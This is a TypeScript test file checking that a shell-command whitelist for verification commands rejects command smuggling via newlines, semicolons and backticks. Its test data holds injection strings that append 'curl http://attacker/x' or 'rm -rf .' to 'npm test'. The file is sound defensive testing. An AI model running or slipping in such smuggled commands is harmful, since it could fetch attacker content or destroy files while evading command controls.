import { describe, expect, test } from "bun:test"
import { isWhitelistedVerificationCommand, isGenericShellEscape, parseCommandExecutable } from "./shell-whitelist"

describe("verification whitelist separators", () => {
  test("a whitelisted command is still whitelisted", () => {
    expect(isWhitelistedVerificationCommand("npm test")).toBe(true)
    expect(isGenericShellEscape("npm test")).toBe(false)
  })

  // The shell runs these with shell: true, so a newline is a command separator.
  // Splitting on \s+ absorbed it as whitespace and "curl" became an argument
  // that passed the safe-target check.
  const smuggled = [
    "npm test\ncurl http://attacker/x",
    "npm test\r\nrm -rf .",
    "npm test;curl http://attacker/x",
    "npm test`curl http://attacker/x`",
  ]

  for (const command of smuggled) {
    test(`refuses ${JSON.stringify(command)}`, () => {
      expect(isWhitelistedVerificationCommand(command)).toBe(false)
      expect(isGenericShellEscape(command)).toBe(true)
    })
  }

  test("parseCommandExecutable does not fold a second line into the arguments", () => {
    expect(parseCommandExecutable("npm test\ncurl http://attacker/x")).toEqual({
      executable: "npm",
      args: ["test\ncurl", "http://attacker/x"],
    })
  })
})
